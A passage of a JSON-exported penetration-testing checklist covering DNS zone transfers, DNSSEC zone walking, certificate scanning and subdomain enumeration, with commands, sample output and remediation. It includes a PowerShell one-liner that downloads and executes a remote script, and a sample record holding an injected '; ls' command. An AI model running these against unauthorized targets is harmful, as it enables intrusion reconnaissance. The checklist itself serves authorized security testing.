          IN      AXFR\n\n;; ANSWER SECTION:\n<strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      SOA     nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 1209600 3600\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        300     IN      HINFO   &quot;Casio fx-700G&quot; &quot;Windows XP&quot;\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        301     IN      TXT     &quot;google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA&quot;\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      MX      0 ASPMX.L.GOOGLE.COM.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      MX      10 ALT1.ASPMX.L.GOOGLE.COM.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      MX      10 ALT2.ASPMX.L.GOOGLE.COM.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      MX      20 ASPMX2.GOOGLEMAIL.COM.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      MX      20 ASPMX3.GOOGLEMAIL.COM.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      MX      20 ASPMX4.GOOGLEMAIL.COM.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      MX      20 ASPMX5.GOOGLEMAIL.COM.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      A       5.196.105.14\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      NS      nsztm1.digi.ninja.\n</span></strong><strong><span style=\"color: #DB2719\">zonetransfer.me.        7200    IN      NS      nsztm2.digi.ninja.\n</span></strong><strong><span style=\"color: #DB2719\">_acme-challenge.zonetransfer.me. 301 IN TXT     &quot;6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI&quot;\n</span></strong><strong><span style=\"color: #DB2719\">_sip._tcp.zonetransfer.me. 14000 IN     SRV     0 0 5060 www.zonetransfer.me.\n</span></strong><strong><span style=\"color: #DB2719\">14.105.196.5.IN-ADDR.ARPA.zonetransfer.me. 7200 IN PTR www.zonetransfer.me.\n</span></strong><strong><span style=\"color: #DB2719\">asfdbauthdns.zonetransfer.me. 7900 IN   AFSDB   1 asfdbbox.zonetransfer.me.\n</span></strong><strong><span style=\"color: #DB2719\">asfdbbox.zonetransfer.me. 7200  IN      A       127.0.0.1\n</span></strong><strong><span style=\"color: #DB2719\">asfdbvolume.zonetransfer.me. 7800 IN    AFSDB   1 asfdbbox.zonetransfer.me.\n</span></strong><strong><span style=\"color: #DB2719\">canberra-office.zonetransfer.me. 7200 IN A      202.14.81.230\n</span></strong><strong><span style=\"color: #DB2719\">cmdexec.zonetransfer.me. 300    IN      TXT     &quot;; ls&quot;\n</span></strong><strong><span style=\"color: #DB2719\">contact.zonetransfer.me. 2592000 IN     TXT     &quot;Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes&quot;\n</span></strong><strong><span style=\"color: #DB2719\">dc-office.zonetransfer.me. 7200 IN      A       143.228.181.132\n</span></strong><strong><span style=\"color: #DB2719\">deadbeef.zonetransfer.me. 7201  IN      AAAA    dead:beaf::\n</span></strong><strong><span style=\"color: #DB2719\">dr.zonetransfer.me.     300     IN      LOC     53 20 56.558 N 1 38 33.526 W 0.00m 1m 10000m 10m\n</span></strong><strong><span style=\"color: #DB2719\">DZC.zonetransfer.me.    7200    IN      TXT     &quot;AbCdEfG&quot;\n</span></strong><strong><span style=\"color: #DB2719\">email.zonetransfer.me.  2222    IN      NAPTR   1 1 &quot;P&quot; &quot;E2U+email&quot; &quot;&quot; email.zonetransfer.me.zonetransfer.me.\n</span></strong><strong><span style=\"color: #DB2719\">email.zonetransfer.me.  7200    IN      A       74.125.206.26\n</span></strong><strong><span style=\"color: #DB2719\">Hello.zonetransfer.me.  7200    IN      TXT     &quot;Hi to Josh and all his class&quot;\n</span></strong><strong><span style=\"color: #DB2719\">home.zonetransfer.me.   7200    IN      A       127.0.0.1\n</span></strong><strong><span style=\"color: #DB2719\">Info.zonetransfer.me.   7200    IN      TXT     &quot;ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.&quot;\n</span></strong><strong><span style=\"color: #DB2719\">internal.zonetransfer.me. 300   IN      NS      intns1.zonetransfer.me.\n</span></strong><strong>[TRUNCATED]</strong>\n\nReceived 2046 bytes from 81.4.108.41&#35;53 in 104 ms</code></pre><h2>Reporting Requirements</h2><ul><li><p>Copy/paste the command and output as a comment for this checklist item</p></li><li><p>Record internal IPs/hostnames</p></li><li><p>Record newly discovered domains to target for additional subdomain enumeration</p></li><li><p>For the finding verification steps, show the command and a truncated version of the output to illustrate the attack process</p></li></ul><p><strong>Running on multiple domains</strong></p><pre><code>cat main_domains.txt | xargs -I % sh -c &quot;echo %;dig axfr @<strong>Client_NS_IP</strong> %;echo&quot;</code></pre><pre><code>while read domain; do dnsrecon -d $domain -t axfr; done &lt; primary_domains.txt | tee dnsrecon_axfr.log</code></pre>",
							"references": "<ul><li>https://www.cisa.gov/news-events/alerts/2015/04/13/dns-zone-transfer-axfr-requests-may-leak-domain-information</li><li>https://learn.microsoft.com/en-us/services-hub/unified/health/remediation-steps-ad/configure-all-dns-zones-only-to-allow-zone-transfers-to-specified-ip-addresses</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>An access list should be used to prevent unauthorized zone transfers. For BIND version 8 and 9 this can be accomplished by setting the allow-transfer option appropriately.</p>"
						},
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "2a5cf61d-b354-4198-8aeb-b96deaf76bc6",
						"name": "DNSSEC (Zone Walking) [ExPowerPen]",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": false,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063351,
							"uid": "a0aa1063-5f3e-e811-80fe-ecf4bbd04073",
							"name": "General Information - Domains - DNSSEC",
							"description": "<p>It was possible to obtain information from common DNSSEC queries.</p>",
							"severityId": -2,
							"businessImpact": "<p>Information obtained could be used to target additional assets.</p>",
							"sourceIdentifier": "M:8e400cad-e958-4063-9ae0-4f66ea5f1adc",
							"verificationInstructions": "<h2>Background Information</h2><p>DNSSEC is a feature of DNS that authenticates responses to domain name lookups, preventing attackers from manipulating the responses to DNS requests. One problem with such a system is that if a domain doesn't exist, there isn't a way to explicitly authenticate an empty DNS response since there is no message to cryptographically sign. DNSSEC uses NSEC and NSEC3 records in its responses to provide this capability.</p><p>NSEC works by returning the &quot;next secure&quot; record. For example, consider a name server that defines AAAA records for api, blog, and www. If a request is made for the store record, it would return an NSEC record containing www, meaning there's no AAAA records between store and www when the records are sorted alphabetically.</p><p>Because of the way NSEC records point to the &quot;next secure&quot; record, it's possible to enumerate all records in a zone without explicitly knowing which records exist in the zone. This functionality can be leveraged by attackers to collect subdomains or gather information about a target organization.</p><h2>Instructions</h2><p>1. Determine if DNSSEC is configured for primary domains, and if so, if NSEC or NSEC3 records are used.</p><p>2. Perform DNSSEC zone walking using one of the variations shown below if NSEC records are used. If NSEC3 records are used, enumeration is not generally possible.</p><h2>1. Determining DNSSEC Support for a Domain</h2><p>To determine if DNSSEC is supported, and if so which type is used (NSEC or NSEC3), you can use <code>dnsrecon</code> with the <code>-z</code> option:</p><pre><code><strong><em>&#35;&#35;&#35; Uses NSEC, can walk the zone\n</em></strong><strong>$ dnsrecon -z -d dnssec-tools.org</strong>\n[&#42;] std: Performing General Enumeration against: dnssec-tools.org...\n[&#42;] <strong><span style=\"color: #DB2719\">DNSSEC is configured for dnssec-tools.org</span></strong>\n[&#42;] DNSKEYs:\n[&#42;]     <strong><span style=\"color: #DB2719\">NSEC</span></strong> ZSK ECDSAP256SHA256 75a3ca46cd136e42ba860ffcac7045f1 963bd07b0c40660fe7bffa09fb7bc0b0 4deb6d608621ae19fb6447c79ccc1af4 14b855d93eb22288073482b4e75df2b2\n[&#42;]     <strong><span style=\"color: #DB2719\">NSEC</span></strong> KSk ECDSAP256SHA256 629d7e855d900bbd9a5f64c562b2d1a1 27b1f1016d2e471211f3a0baa20ca6c7 6aaf70a3b8e089a8757faf95b45c35ef 8a7a4a3f762548d4814e238311756401\n<strong>[TRUNCATED]\n\n</strong><strong><em>&#35;&#35;&#35; Uses NSEC3, can't walk the zone\n</em></strong><strong>$ dnsrecon -z -d example.com</strong>\n[&#42;] std: Performing General Enumeration against: example.com...\n[&#42;] <strong><span style=\"color: #DB2719\">DNSSEC is configured for example.com</span></strong>\n[&#42;] DNSKEYs:\n[&#42;]     <strong><span style=\"color: #DB2719\">NSEC3</span></strong> ZSK ECDSAP256SHA256 fe744b06dc760205bdb214994784155b a377af4fad1c28e21dce209e5998d555 e0812d1f8927e3b2b905382645187ad0 585946f37f62215ed3a12164d3046f3b\n[&#42;]     <strong><span style=\"color: #DB2719\">NSEC3</span></strong> KSk ECDSAP256SHA256 9172a4bd6537bc661f4c91a5dea05de2 a8625a9e5a46ced8b64089c43d9dfade ca5eac1a870c3922026dc494f6c8522d 96081acf27d7a891153a6309dea4f4b5\n<strong>[TRUNCATED]\n\n</strong><strong><em>&#35;&#35;&#35; Does not use DNSSEC, can't walk the zone\n</em></strong><strong>$ dnsrecon -z -d netspi.com</strong>\n[&#42;] std: Performing General Enumeration against: netspi.com...\n[-] <strong><span style=\"color: #DB2719\">DNSSEC is not configured for netspi.com\n</span></strong><strong>[TRUNCATED]</strong></code></pre><h2>2. Performing Zone Walking for a Domain</h2><h2>Variation: ldns-walk</h2><h3>Install</h3><pre><code>$ sudo apt install ldnsutils</code></pre><h3>Execution Example</h3><pre><code><strong><em>&#35;&#35;&#35; Uses NSEC, can walk the zone\n</em></strong><strong>$ ldns-walk dnssec-tools.org\n</strong><strong><span style=\"color: #DB2719\">dnssec-tools.org.       dnssec-tools.org. A NS SOA MX TXT RRSIG NSEC DNSKEY CAA\n</span></strong><strong><span style=\"color: #DB2719\">donuts.dnssec-tools.org. A RRSIG NSEC\n</span></strong><strong><span style=\"color: #DB2719\">flux.dnssec-tools.org. NS RRSIG NSEC\n</span></strong><strong><span style=\"color: #DB2719\">git.dnssec-tools.org. CNAME RRSIG NSEC\n</span></strong><strong><span style=\"color: #DB2719\">ksktest.dnssec-tools.org. NS RRSIG NSEC\n</span></strong><strong><span style=\"color: #DB2719\">lists.dnssec-tools.org. A RRSIG NSEC\n</span></strong><strong><span style=\"color: #DB2719\">_25._tcp.mail.dnssec-tools.org. CNAME RRSIG NSEC\n</span></strong><strong><span style=\"color: #DB2719\">nsm.dnssec-tools.org. A MX RRSIG NSEC\n</span></strong><strong><span style=\"color: #DB2719\">nsr.dnssec-tools.org. A MX RRSIG NSEC\n</span></strong><strong><span style=\"color: #DB2719\">nst1.dnssec-tools.org. A MX RRSIG NSEC\n</span></strong><strong><span style=\"color: #DB2719\">nsw.dnssec-tools.org. A MX RRSIG NSEC\n</span></strong><strong><span style=\"color: #DB2719\">stats.dnssec-tools.org. A RRSIG NSEC\n</span></strong><strong><span style=\"color: #DB2719\">test.dnssec-tools.org. NS RRSIG NSEC\n</span></strong><strong><span style=\"color: #DB2719\">www.dnssec-tools.org. A RRSIG NSEC\n\n</span></strong><strong><em>&#35;&#35;&#35; Uses NSEC3, can't walk the zone\n</em></strong><strong>$ ldns-walk example.com</strong>\nexample.com.    <strong><span style=\"color: #DB2719\">Zone does not seem to be DNSSEC secured,or it uses NSEC3</span></strong>.\n\n<strong><em>&#35;&#35;&#35; Does not use DNSSEC, can't walk the zone\n</em></strong><strong>$ ldns-walk netspi.com\n</strong><strong><span style=\"color: #DB2719\">No DNSSEC data received</span></strong>; either the zone is not secured or you should query it directly (with @nameserver)</code></pre><h2>Variation: dnsrecon</h2><h3>Install</h3><pre><code>$ sudo apt install dnsrecon</code></pre><h3>Execution Example</h3><pre><code><strong><em>&#35;&#35;&#35; Uses NSEC, can walk the zone\n</em></strong><strong><em>&#35;&#35;&#35; Note the larger number of records returned as a result of being able to walk the zone\n</em></strong><strong>$ dnsrecon -t zonewalk -d dnssec-tools.org\n</strong><strong><span style=\"color: #DB2719\">[&#42;] Performing NSEC Zone Walk for dnssec-tools.org</span></strong>\n[&#42;] Getting SOA record for dnssec-tools.org\n[-] This zone appears to be misconfigured, no SOA record found.\n<strong><span style=\"color: #DB2719\">[&#42;]      A dnssec-tools.org 185.199.108.153\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A dnssec-tools.org 185.199.109.153\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A dnssec-tools.org 185.199.110.153\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A dnssec-tools.org 185.199.111.153\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A donuts.dnssec-tools.org 69.163.218.238\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A flux.dnssec-tools.org no_ip\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      CNAME git.dnssec-tools.org pub.tislabs.com\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A pub.tislabs.com 192.94.214.203\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A ksktest.dnssec-tools.org 68.78.72.17\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A rec1.ksktest.dnssce-tools.org.ksktest.dnssec-tools.org 127.0.0.1\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A lists.dnssec-tools.org 192.94.214.6\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A rec2.ksktest.dnssce-tools.org.ksktest.dnssec-tools.org 127.0.0.2\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A mail.dnssec-tools.org 107.220.113.177\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A rec3.ksktest.dnssce-tools.org.ksktest.dnssec-tools.org 127.0.0.3\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A rec4.ksktest.dnssce-tools.org.ksktest.dnssec-tools.org 127.0.0.4\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A nsm.dnssec-tools.org 104.254.247.74\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A nsr.dnssec-tools.org 199.101.97.233\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A nst1.dnssec-tools.org 192.94.214.100\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A nsw.dnssec-tools.org 107.220.113.177\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A stats.dnssec-tools.org 69.163.220.144\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A test.dnssec-tools.org no_ip\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      A www.dnssec-tools.org 107.220.113.177\n</span></strong><strong><span style=\"color: #DB2719\">[+] 22 records found\n\n</span></strong><strong><em>&#35;&#35;&#35; Uses NSEC3, can't walk the zone\n</em></strong><strong><em>&#35;&#35;&#35; Note the lack of records returned, which is typical when NSEC3 is enabled\n</em></strong><strong>$ dnsrecon -t zonewalk -d example.com\n</strong><strong><span style=\"color: #DB2719\">[&#42;] Performing NSEC Zone Walk for example.com</span></strong>\n[&#42;] Getting SOA record for example.com\n[&#42;] Name Server 199.4.138.53 will be used\n<strong><span style=\"color: #DB2719\">[&#42;]      A example.com 93.184.216.34\n</span></strong><strong><span style=\"color: #DB2719\">[&#42;]      AAAA example.com 2606:2800:220:1:248:1893:25c8:1946\n</span></strong><strong><span style=\"color: #DB2719\">[+] 2 records found\n\n</span></strong><strong><em>&#35;&#35;&#35; Does not use DNSSEC, can't walk the zone\n</em></strong><strong><em>&#35;&#35;&#35; Note the lack of records returned due to DNSSEC not being enabled\n</em></strong><strong>$ dnsrecon -t zonewalk -d netspi.com\n</strong><strong><span style=\"color: #DB2719\">[&#42;] Performing NSEC Zone Walk for netspi.com</span></strong>\n[&#42;] Getting SOA record for netspi.com\n[&#42;] Name Server 205.251.194.147 will be used\n<strong><span style=\"color: #DB2719\">[&#42;]      A netspi.com 34.123.201.87\n</span></strong><strong><span style=\"color: #DB2719\">[+] 1 records found</span></strong></code></pre><h2>Reporting Requirements</h2><ul><li><p>Copy/paste the command and output as a comment for this checklist item</p></li><li><p>Record internal IPs/hostnames</p></li><li><p>Record newly discovered domains to target for additional subdomain enumeration</p></li></ul>",
							"references": "<ul><li>https://en.wikipedia.org/wiki/Domain_Name_System_Security_Extensions</li><li>https://github.com/darkoperator/dnsrecon</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Disabled DNSSEC if it is note required, prevent direct access from the internet.</p>"
						},
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d528eb13-1a7b-46b2-bfef-a8e77d836d62",
						"name": "Subdomains - SSL Certificate Scanning [ExPowerPen]",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": false,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063356,
							"uid": "8ed2bd66-603e-e811-80fe-ecf4bbd04073",
							"name": "General Information - Domains - SSL Certificate Scanning",
							"description": "<p>Identify sub domains by downloading SSL certificates and reviewing information such the commonName and Alternative names.</p>",
							"severityId": -2,
							"businessImpact": "<p>Information identified could be used in future attacks.</p>",
							"sourceIdentifier": "M:7743a2d7-ef2e-4eaf-baee-ef858d1b2414",
							"verificationInstructions": "<h2>Background Information</h2><p>Exposed services using SSL/TLS for encryption can disclose domain and subdomain information through the CN (common name) and SAN (subject alternative name) fields of the SSL certificate. Additional subdomains for a primary domain that is being enumerated can be collected by extracting these field values from the SSL certificates of in-scope IPs and domains being targeted for the engagement. New primary domains can also be uncovered to perform additional subdomain enumeration on.</p><h2>Instructions</h2><p>Review SSL certificates deployed to SSL/TLS-enabled services on in-scope IPs and domains to identify new subdomains, new primary domains, or internal hostnames.</p><h2>Performing SSL Certificate Scanning for In-Scope IPs/Domains</h2><h2>Variation: tlsx (Recommended)</h2><p><strong>Install:</strong></p><pre><code>$ go install github.com/projectdiscovery/tlsx/cmd/tlsx@latest</code></pre><p><strong>Note:</strong> Pre-compiled binaries are also available for Windows, Linux, and ARM systems at: <a href='https://github.com/projectdiscovery/tlsx/releases'>https://github.com/projectdiscovery/tlsx/releases</a></p><p><strong>Execution Example:</strong></p><pre><code><strong>$ cat in-scope-ips-and-domains.txt | tlsx -silent -cn -san -ro | sort -u</strong>\nal.netspi.com\nbas-login.netspi.com\nftp.netspi.com\nvpn.netspi.com\nwww.ftp.netspi.com\nwww.netspi.com\nwww.vpn.netspi.com</code></pre><p><strong>Note: </strong>It is most beneficial to have port scan information first so the input list can be formatted as IP:PORT and DOMAIN:PORT to include SSL/TLS-enabled services running on ports besides TCP/443. If only IP or DOMAIN are specified in the list without a port, then tlsx will automatically try TCP/443. If port scanning hasn't been conducted yet, it might be worthwhile to specify a common collection of SSL-enabled ports with the command:</p><p><strong>Execution Example (multi-port):</strong></p><pre><code><strong>$ cat in-scope-ips-and-domains.txt | tlsx -silent -cn -san -ro -p 443,4443,8443,465,587,990,993,995,10443 | sort -u</strong>\nal.netspi.com\nbas-login.netspi.com\nftp.netspi.com\nvpn.netspi.com\nwww.ftp.netspi.com\nwww.netspi.com\nwww.vpn.netspi.com</code></pre><h2>Variation: cero</h2><h3>Install</h3><pre><code>$ go install github.com/glebarez/cero@latest</code></pre><p><strong>Note:</strong> Pre-compiled binaries are also available for Windows, Linux, and macOS systems at: <a href='https://github.com/glebarez/cero/releases'>https://github.com/glebarez/cero/releases</a></p><h3>Execution Example</h3><pre><code><strong>$ cat in-scope-ips-and-domains.txt | cero-linux-amd64 | sort -u</strong>\nal.netspi.com\nbas-login.netspi.com\nftp.netspi.com\nvpn.netspi.com\nwww.ftp.netspi.com\nwww.netspi.com\nwww.vpn.netspi.com</code></pre><p><strong>Note: </strong>It is most beneficial to have port scan information first so the input list can be formatted as IP:PORT and DOMAIN:PORT to include SSL/TLS-enabled services running on ports besides TCP/443. If only IP or DOMAIN are specified in the list without a port, then cero will automatically try TCP/443. If port scanning hasn't been conducted yet, it might be worthwhile to specify a common collection of SSL-enabled ports with the command:</p><p><strong>Execution Example (multi-port):</strong></p><pre><code><strong>$ cat in-scope-ips-and-domains.txt | cero-linux-amd64 -p 443,4443,8443,465,587,990,993,995,10443 | sort -u</strong>\nal.netspi.com\nbas-login.netspi.com\nftp.netspi.com\nvpn.netspi.com\nwww.ftp.netspi.com\nwww.netspi.com\nwww.vpn.netspi.com</code></pre><h2>Variation: Get-SSLCertInfo-Scan</h2><p><strong>Load Into PowerShell Session</strong></p><pre><code>PS C:\\&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerShell/master/Get-SSLCertInfo-Scan.psm1')</code></pre><p><strong>Execution Example</strong></p><pre><code>PS C:\\&gt; <strong>Get-SSLCertInfo-Scan -InputFile C:\\in-scope-ips-and-domains.txt -OnlyDomainList</strong>\n\nDomainName\n----------\nal.netspi.com\nbas-login.netspi.com\nftp.netspi.com\nvpn.netspi.com\nwww.ftp.netspi.com\nwww.netspi.com\nwww.vpn.netspi.com</code></pre><p><strong>Note:</strong> It is most beneficial to have port scan information first so the input list can be formatted as IP:PORT and DOMAIN:PORT to include SSL/TLS-enabled services running on ports besides TCP/443. If only IP or DOMAIN are specified in the list without a port, then Get-SSLCertInfo-Scan will automatically try TCP/443.</p><h2>Variation: Nessus Plugin - &quot;SSL - Certificate Information&quot;</h2><p>Manually review data in the Resolve workspace or Nessus scanner for the &quot;SSL - Certificate Information&quot; Nessus finding.</p>",
							"references": "<ul><li>https://github.com/cheetz/sslScrape</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that all internet facing SSL certificates are signed by a trusted certificate authority and do not contain internal asset information. Corrective actions may not be required, but it is important to be aware that data from SSL certificates can be viewed and leveraged by attackers.</p>"
						},
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "b2855fd2-3e76-499f-9582-954cd09c9b11",
						"name": "Subdomains - BBOT [ExPowerPen]",
						"instructions": "<h2>Background Information</h2><p>Subdomain enumeration is primarily used to identify additional web targets, or additional attack surface on existing web targets. Specific subdomains may be required to access a website or web application when connecting to web ports that make use of Host headers to host multiple websites on the same port. By enumerating these additional subdomains, it may be possible to uncover additional websites that can be targeted for testing.</p><p>BBOT is an OSINT discovery tool that returns valid domains and subdomains for websites, along with other information, using passive online sources and active reconnaissance of web servers. We use it as one of our primary tools to help gather subdomains related to the primary domains we're targeting for an engagement.</p><h2>Instructions</h2><p>Run BBOT to collect domains and subdomains for all targeted primary domains.</p><h2>Variation: BBOT </h2><h3>Install</h3><pre><code>$ pipx install bbot</code></pre><p>Alternatively, the latest version can be installed from source from the GitHub repository at <a href='https://github.com/blacklanternsecurity/bbot'>https://github.com/blacklanternsecurity/bbot</a></p><h3>Configuration</h3><p>BBOT supports a large number of source providers to search for subdomains. Some are included by default and require no special configuration to use, others require API keys configured in BBOT's <code>secrets.yaml</code> file. By default, this file is located (or can be created at) <code>$CONFIG/bbot/secrets.yaml</code>.</p><p>As of 2/5/2024, the following sources are permitted for commercial use and require signing up to obtain an API key:</p><ul><li><p>bevigil - <a href='https://bevigil.com/login'>https://bevigil.com/login</a></p></li><li><p>binaryedge - <a href='https://app.binaryedge.io/sign-up'>https://app.binaryedge.io/sign-up</a></p></li><li><p>chaos - <a href='https://chaos.projectdiscovery.io/#/'>https://chaos.projectdiscovery.io/&#35;/</a></p></li><li><p>fullhunt - <a href='https://fullhunt.io/signup/'>https://fullhunt.io/signup/</a></p></li></ul><p>Signing up for API keys is not required, but does help return additional results. You can generally sign up with a personal email account or a dummy/throwaway account depending on your preference. Details about the configuration of the API keys in the BBOT tool can be found here: <a href='https://www.blacklanternsecurity.com/bbot/#installation'>https://www.blacklanternsecurity.com/bbot/&#35;installation</a></p><p>These API keys are <strong>REQUIRED</strong>:</p><ul><li><p>github - <a href='https://github.com'>https://github.com</a> (create a minimally-scoped, read-only API key for public repository searching)</p></li><li><p>hunterio (NetSPI has an account, check PasswordState)</p></li><li><p>dehashed (NetSPI has an account, check PasswordState)</p></li><li><p>shodan (NetSPI has an account, check PasswordState)</p></li></ul><h3>Execution Example</h3><p>The subdomain-enum or safe values can be used for the -f option. Safe will be more comprehensive but may include some out of scope data and will make active connections.</p><p><strong>Single Domain Target:</strong></p><pre><code><strong>$ bbot -t netspi.com -f subdomain-enum -om subdomains -n netspi -y -s\n</strong><strong>$ cat ~/.bbot/scans/netspi/subdomains.txt | sort -u\n</strong><strong>[TRUNCATED]</strong>\nresolve.netspi.com\nvpn.netspi.com\nwww.netspi.com\n<strong>[TRUNCATED]</strong></code></pre><p><strong>File with List of Target Domains:</strong></p><pre><code><strong>$ bbot -t primary-domains.txt -f subdomain-enum -om subdomains -n netspi -y -s\n</strong><strong>$ cat ~/.bbot/scans/netspi/subdomains.txt | sort -u\n</strong><strong>[TRUNCATED]</strong>\nplatform.netspi.ai\nwww.netspi.com\nwww.silentbreaksecurity.com\n<strong>[TRUNCATED]</strong></code></pre><h2>Reporting Requirements</h2><p>1. Copy/paste the command and output as a comment on this checklist item.</p><p>2. Zip and upload the scan folder to Artifacts.</p><p>3. In the master spreadsheet being maintained, add the subdomains from this output to a new column called bbot in a Subdomains sheet in the spreadsheet.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "b9e1017a-57c1-4e77-b7e0-3502095fb9b5",
						"name": "Subdomains - Rapid7 OpenData [ExPowerPen]",
						"instructions": "<h2>Instructions</h2><p>Rapid7 stores a lot of internet data that can be used during recon and information gathering. Review data sets as needed to identify subdomains.</p><p>Data sets can be downloaded from https://opendata.rapid7.com/.</p><h2>Variation: rapid_dns_query.py</h2><p>Note: Jake Karnes has a POC available for querying in scope domains and IPS at: https://github.com/NetSPI/rapid_dns_query</p><h3>Example:</h3><pre><code>python3 rapid_dns_query.py --domains .netspi. --ips 207.87.188.224/27 209.118.108.192/27 --profile athena_query --outputfile results.csv</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "fd623d54-049b-49d4-a622-d0d4bd3a6d83",
						"name": "Subdomains - subfinder [ExPowerPen]",
						"instructions": "<h2>Background Information</h2><p>Subdomain enumeration is primarily used to identify additional web targets, or additional attack surface on existing web targets. Specific subdomains may be required to access a website or web application when connecting to web ports that make use of Host headers to host multiple websites on the same port. By enumerating these additional subdomains, it may be possible to uncover additional websites that can be targeted for testing.</p><p>subfinder is a subdomain discovery tool that returns valid subdomains for websites, using passive online sources. We use it as one of our primary tools to help gather subdomains related to the primary domains we're targeting for an engagement.</p><h2>Instructions</h2><p>Run subfinder to collect subdomains for all targeted primary domains.</p><h2>Variation: subfinder</h2><h3>Install</h3><pre><code>$ go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest</code></pre><p>Alternatively, the latest binaries can be downloaded from the GitHub repository at <a href='https://github.com/projectdiscovery/subfinder/releases'>https://github.com/projectdiscovery/subfinder/releases</a></p><h3>Configuration</h3><p>subfinder supports a large number of source providers to search for subdomains. Some are included by default and require no special configuration to use, others require API keys configured in subfinder's <code>provider-config.yaml</code> file. By default, this file is located (or can be created at) <code>$CONFIG/subfinder/provider-config.yaml</code>.</p><p>As of 1/5/2024, the following sources are permitted for commercial use and require signing up to obtain an API key:</p><ul><li><p>bevigil - <a href='https://bevigil.com/login'>https://bevigil.com/login</a></p></li><li><p>binaryedge - <a href='https://app.binaryedge.io/sign-up'>https://app.binaryedge.io/sign-up</a></p></li><li><p>certspotter - <a href='https://sslmate.com/signup?for=ct_search_api'>https://sslmate.com/signup?for=ct_search_api</a></p></li><li><p>chaos - <a href='https://chaos.projectdiscovery.io/#/'>https://chaos.projectdiscovery.io/&#35;/</a></p></li><li><p>fullhunt - <a href='https://fullhunt.io/signup/'>https://fullhunt.io/signup/</a></p></li><li><p>github - <a href='https://github.com'>https://github.com</a> (create a minimally-scoped, read-only API key for public repository searching)</p></li><li><p>hunter (NetSPI has an account, check PasswordState)</p></li><li><p>shodan (NetSPI has an account, check PasswordState)</p></li></ul><p>Signing up for API keys is not required, but does help return additional results. You can generally sign up with a personal email account or a dummy/throwaway account depending on your preference. Details about the configuration of the API keys in the subfinder tool can be found here: <a href='https://github.com/projectdiscovery/subfinder?tab=readme-ov-file#post-installation-instructions'>https://github.com/projectdiscovery/subfinder?tab=readme-ov-file&#35;post-installation-instructions</a></p><h3>Execution Example</h3><p><strong>Single Domain Target:</strong></p><pre><code><strong>$ subfinder -silent -all -d netspi.com | sort -u</strong>\nal.netspi.com\nasm-backchannel.netspi.com\nasm-dev.netspi.com\nasm-login.netspi.com\nasm.netspi.com\nattacksim-aws.netspi.com\n<strong>[TRUNCATED]</strong></code></pre><p><strong>File with List of Target Domains:</strong></p><pre><code><strong>$ subfinder -silent -all -dL primary-domains.txt | sort -u</strong>\nal.netspi.com\nasm-backchannel.netspi.com\nasm-dev.netspi.com\nasm-login.netspi.com\nasm.netspi.com\nattacksim-aws.netspi.com\n<strong>[TRUNCATED]</strong></code></pre><h2>Reporting Requirements</h2><p>1. 